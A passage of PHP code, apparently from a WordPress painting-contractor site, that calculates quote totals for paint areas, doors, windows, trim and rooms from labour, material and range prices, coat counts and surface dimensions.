									$extras_total = $extras_total + ($labour_and_material_total * $extra_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ($range_price_total * $extra_count);
							}

					}
			}

		   $other = $data['other'];
			$other_total = 0;
			foreach($other_data as $temp) {
					if( in_array($temp['title'],$other) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($other_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$other_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$other_total = $other_total + ($labour_and_material_total * $extra_count);
							}
							elseif($other_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$other_total = $other_total + ($range_price_total * $extra_count);
							}

					}
			}
				
			$surface = $data['surface'];
			$surface_total = 0;
			foreach($surface_data as $temp) {
					if( in_array($temp['title'],$surface) ) {

							if($surface_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$surface_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$surface_total = $surface_total + $labour_and_material_total;
							}
							elseif($surface_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$surface_total = $surface_total + $range_price_total;
							}

					}
			}

			$percent_total = $surface_total / 100;
		  $rooms_total = $p_rooms_total * $percent_total;
			$rooms_price_total = $rooms_total + ($rooms_total * $height_total / 100) + $other_total + $extras_total;
			$paint_interior = $rooms_price_total + ($rooms_price_total * $paint_supply_total / 100);
			$sealer_total_price = ($paint_interior * $sealer_total) / 100;
      $paint_interior_total = $paint_interior + $sealer_total_price;

			$total = $total + $paint_interior_total;
		
	}

  
  
  // formulas for room painting
	if(get_the_title($t) == 'Paint Area') {

							  $all_scope_data = get_field('quote_fields',$t);

							  $width = $data['area_width'];
							  $length = $data['area_length'];
		
							  foreach($all_scope_data as $d) {
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'type') {
											$type_title = $d['title'];
											$type_prices = $d['type_of_price'];
											$type_data = $d['fields'];
									}
                  if($d['slug'] == 'proposed') {
											$new_title = $d['title'];
											$new_prices = $d['type_of_price'];
											$new_data = $d['fields'];
									}
                  if($d['slug'] == 'coating') {
											$coats_title = $d['title'];
											$coats_prices = $d['coats_of_price'];
											$coats_data = $d['fields'];
									}
									if($d['slug'] == 'extras') {
											$extras_title = $d['title'];
											$extras_prices = $d['type_of_price'];
											$extras_data = $d['fields'];
									}
									if($d['slug'] == 'doors') {
											$doors_title = $d['title'];
											$doors_prices = $d['type_of_price'];
											$doors_data = $d['fields'];
									}
									if($d['slug'] == 'prep') {
											$prep_title = $d['title'];
											$prep_prices = $d['type_of_price'];
											$prep_data = $d['fields'];
									}
									if($d['slug'] == 'paint') {
											$paint_title = $d['title'];
											$paint_prices = $d['type_of_price'];
											$paint_data = $d['fields'];
									}   															
								}

				
			$area = $width * $length;

			$current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if( $temp['title'] == $current)  {

							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total +  ($labour_and_material_total * $area);
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + ($range_price_total * $area);
							}

					}

			}
		
			$type = $data['type'];
			$type_total = 0;
			foreach($type_data as $temp) {
					if( $temp['title'] == $type) {


							if($type_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$type_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$type_total = $type_total +  ( $labour_and_material_total * $area);
							}
							elseif($type_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$type_total = $type_total + ( $range_price_total * $area);
							}

					}

			}
		
		
		
			$new = $data['proposed'];
			$new_total = 0;
			foreach($new_data as $temp) {
					if( $temp['title'] == $new) {
						
							if($new_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$new_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$new_total = $new_total +  ($labour_and_material_total * $area);
							}
							elseif($new_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$new_total = $new_total + ($range_price_total * $area);
							}

					}

			}
		
		
			$coating = $data['coating'];
			$coats_total = 1;
			foreach($coats_data as $temp) {
					if($temp['title'] == $coating) {

							// let's count QNT of each coating field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$coats_count = $data['' . $count_field_title . ''];
							if($coats_count == NULL || $coats_count == '' || empty($coats_count)) {
								   $coats_count = 1;
							}
              if($coats_count == 2) {$coats_count = 1.4;}
              elseif($coats_count == 3) {$coats_count = 2;}
              elseif($coats_count == 4) {$coats_count = 2.3;}
              elseif($coats_count == 5) {$coats_count = 2.6;}
              elseif($coats_count == 6) {$coats_count = 2.9;}
              elseif($coats_count == 7) {$coats_count = 3.2;}
            
              $coats_total = $coats_total * $coats_count;
					}
 
			}
		

			$prep = $data['prep'];
			$prep_total = 0;
			foreach($prep_data as $temp) {
					if( $temp['title'] == $prep) {


							if($prep_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$prep_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$prep_total = $prep_total +  ( $labour_and_material_total * $area);
							}
							elseif($prep_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$prep_total = $prep_total + ( $range_price_total * $area);
							}

					}

			}
		
		
		  $doors = $data['doors'];
			$doors_total = 0;
			foreach($doors_data as $temp) {
					if( in_array($temp['title'],$doors) ) {

							// let's count QNT of each doors field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$doors_count = $data['' . $count_field_title . ''];
							if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
								   $doors_count = 1;
							}

							if($doors_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
							}
							elseif($doors_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$doors_total = $doors_total + ( $range_price_total * $doors_count);
							}

					}

			}

			$extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each doors field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extras_count = $data['' . $count_field_title . ''];
							if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
								   $extras_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extras_count);
							}

					}

			}

	
			$paint = $data['paint'];
			$paint_total = 0;
			foreach($paint_data as $temp) {
					if( $temp['title'] == $paint ) {

							$range_price_total = $temp['range_price'];
							$paint_total = $range_price_total;

					}
			}

			
		$p_total = $current_total + $type_total + $new_total + $doors_total;
		$paint_supply = ($p_total * $paint_total) / 100;
		$sum_total = ($p_total + $paint_supply) * $coats_total;
		
		$main_total = $sum_total + $extras_total + $prep_total; 

		$total = $total + $main_total;


		}
     
	// formulas for room painting
	if(htmlspecialchars_decode( get_the_title($t) ) == 'Doors, Windows & Trim') {
							  $all_scope_data = get_field('quote_fields',$t);

							  foreach($all_scope_data as $d) {
									if($d['slug'] == 'windows') {
											$windows_title = $d['title'];
											$windows_prices = $d['type_of_price'];
											$windows_data = $d['fields'];
									}
                  if($d['slug'] == 'doors') {
											$doors_title = $d['title'];
											$doors_prices = $d['type_of_price'];
											$doors_data = $d['fields'];
									}	
									if($d['slug'] == 'current') {
											$current_title = $d['title'];
											$current_prices = $d['type_of_price'];
											$current_data = $d['fields'];
									}
									if($d['slug'] == 'coating') {
											$coats_title = $d['title'];
											$coats_prices = $d['type_of_price'];
											$coats_data = $d['fields'];
									}
									if($d['slug'] == 'trim') {
											$trim_title = $d['title'];
											$trim_prices = $d['type_of_price'];
											$trim_data = $d['fields'];
									}
									if($d['slug'] == 'paint') {
											$paint_title = $d['title'];
											$paint_prices = $d['type_of_price'];
											$paint_data = $d['fields'];
									}
								}

							
			$windows = $data['windows'];
			$windows_total = 0;
			foreach($windows_data as $temp) {
					if( in_array($temp['title'],$windows) ) {

							// let's count QNT of each windows field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$windows_count = $data['' . $count_field_title . ''];
							if($windows_count == NULL || $windows_count == '' || empty($windows_count)) {
								   $windows_count = 1;
							}

							if($windows_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$windows_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$windows_total = $windows_total +  ( $labour_and_material_total * $windows_count);
							}
							elseif($windows_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$windows_total = $windows_total + ( $range_price_total * $windows_count);
							}

					}

			}				
		
			  $doors = $data['doors'];
			$doors_total = 0;
			foreach($doors_data as $temp) {
					if( in_array($temp['title'],$doors) ) {

							// let's count QNT of each doors field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$doors_count = $data['' . $count_field_title . ''];
							if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
								   $doors_count = 1;
							}

							if($doors_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
							}
							elseif($doors_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$doors_total = $doors_total + ( $range_price_total * $doors_count);
							}

					}

			}

		  $current = $data['current'];
			$current_total = 0;
			foreach($current_data as $temp) {
					if($temp['title'] == $current) {

							// let's count QNT of each current field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$current_count = $data['' . $count_field_title . ''];
							if($current_count == NULL || $current_count == '' || empty($current_count)) {
								   $current_count = 1;
							}

							if($current_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_total = $current_total + $labour_and_material_total;
							}
							elseif($current_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_total = $current_total + $range_price_total;
							}

					}

			}
		
			$trim = $data['trim'];
			$trim_total = 0;
			foreach($trim_data as $temp) {
					if( in_array($temp['title'],$trim) ) {

							// let's count QNT of each trim field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$trim_count = $data['' . $count_field_title . ''];
							if($trim_count == NULL || $trim_count == '' || empty($trim_count)) {
								   $trim_count = 1;
							}

							if($trim_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$trim_total = $trim_total +  ( $labour_and_material_total * $trim_count);
							}
							elseif($trim_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$trim_total = $trim_total + ( $range_price_total * $trim_count);
							}

					}

			}

		  $coating = $data['coating'];
			$coats_total = 1;
			foreach($coats_data as $temp) {
					if($temp['title'] == $coating) {

							// let's count QNT of each coating field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$coats_count = $data['' . $count_field_title . ''];
							if($coats_count == NULL || $coats_count == '' || empty($coats_count)) {
								   $coats_count = 1;
							}
              if($coats_count == 2) {$coats_count = 1.4;}
              elseif($coats_count == 3) {$coats_count = 2;}
              elseif($coats_count == 4) {$coats_count = 2.3;}
              elseif($coats_count == 5) {$coats_count = 2.6;}
              elseif($coats_count == 6) {$coats_count = 2.9;}
              elseif($coats_count == 7) {$coats_count = 3.2;}
            
              $coats_total = $coats_total * $coats_count;
					}
 
			}
		
		
			$paint = $data['paint'];
			$paint_total = 0;
			foreach($paint_data as $temp) {
					if( $temp['title'] == $paint ) {

							$range_price_total = $temp['range_price'];
							$paint_total = $range_price_total;

					}
			}

		
						 $painting_total = $doors_total + $windows_total + $trim_total;
		         $prep_total = $painting_total * $current_total / 100;
						 $paint_supply = $painting_total * $paint_total / 100;
		         $coating = $painting_total + $paint_supply;
						 $paint_room_total = $coating * $coats_total + $prep_total;

					 	$total = $total + $paint_room_total;


			}
	
	   // formulas for room painting
        if(get_the_title($t) == 'Room Painting') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $width = $data['area_width'];
                                  $length = $data['area_length'];
                                  $height = $data['height'];
                                  foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current_walls') {
                                                $current_walls_title = $d['title'];
                                                $current_walls_prices = $d['type_of_price'];
                                                $current_walls_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'wall_prep') {
                                                $wall_prep_title = $d['title'];
                                                $wall_prep_prices = $d['type_of_price'];
                                                $wall_prep_data = $d['fields'];
                                        }
																		   if($d['slug'] == 'coating') {
																									$coats_title = $d['title'];
																									$coats_prices = $d['coats_of_price'];
																									$coats_data = $d['fields'];
																							}
																								if($d['slug'] == 'new_walls') {
                                                $new_walls_title = $d['title'];
                                                $new_walls_prices = $d['type_of_price'];
                                                $new_walls_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'current_ceiling') {
                                                $current_ceiling_title = $d['title'];
                                                $current_ceiling_prices = $d['type_of_price'];
                                                $current_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'ceiling_prep') {
                                                $ceiling_prep_title = $d['title'];
                                                $ceiling_prep_prices = $d['type_of_price'];
                                                $ceiling_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_ceiling') {
                                                $new_ceiling_title = $d['title'];
                                                $new_ceiling_prices = $d['type_of_price'];
                                                $new_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'doors') {
                                                $doors_title = $d['title'];
                                                $doors_prices = $d['type_of_price'];
                                                $doors_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'paint') {
                                                $paint_title = $d['title'];
                                                $paint_prices = $d['type_of_price'];
                                                $paint_data = $d['fields'];
                                        }   																}

	                              $wall_area = ( $width + $width + $length + $length ) * $height;
                                $ceiling_area = $width * $length;
                                $outer_length = $width + $width + $length + $length;

                $current_walls = $data['current_walls'];
                $current_walls_total = 0;
                foreach($current_walls_data as $temp) {
                        if( $temp['title'] == $current_walls) {


                                if($current_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_walls_total = $current_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($current_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_walls_total = $current_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $wall_prep = $data['wall_prep'];
                $wall_prep_total = 0;
                foreach($wall_prep_data as $temp) {
                        if( in_array($temp['title'],$wall_prep) ) {

                                if($wall_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        $wall_prep_total = $wall_prep_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($wall_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_prep_total = $wall_prep_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

                $new_walls = $data['new_walls'];
                $new_walls_total = 0;
                foreach($new_walls_data as $temp) {
                        if($temp['title'] == $new_walls) {

                                       if($new_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_walls_total = $new_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($new_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_walls_total = $new_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $current_ceiling = $data['current_ceiling'];
                $current_ceiling_total = 0;
                foreach($current_ceiling_data as $temp) {
                        if($temp['title'] == $current_ceiling) {


                                if($current_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_ceiling_total = $current_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($current_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_ceiling_total = $current_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }

                $ceiling_prep = $data['ceiling_prep'];
                $ceiling_prep_total = 0;
                foreach($ceiling_prep_data as $temp) {
                        if($temp['title'] == $ceiling_prep) {


                                if($ceiling_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$ceiling_prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $ceiling_prep_total = $ceiling_prep_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($ceiling_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $ceiling_prep_total = $ceiling_prep_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $new_ceiling = $data['new_ceiling'];
                $new_ceiling_total = 0;
                foreach($new_ceiling_data as $temp) {
                        if($temp['title'] == $new_ceiling) {


                                if($new_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_ceiling_total = $new_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($new_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_ceiling_total = $new_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $doors_count = $data['' . $count_field_title . ''];
                                if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
                                       $doors_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $doors_total = $doors_total + ( $range_price_total * $doors_count);
                                }

                        }

                }

                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
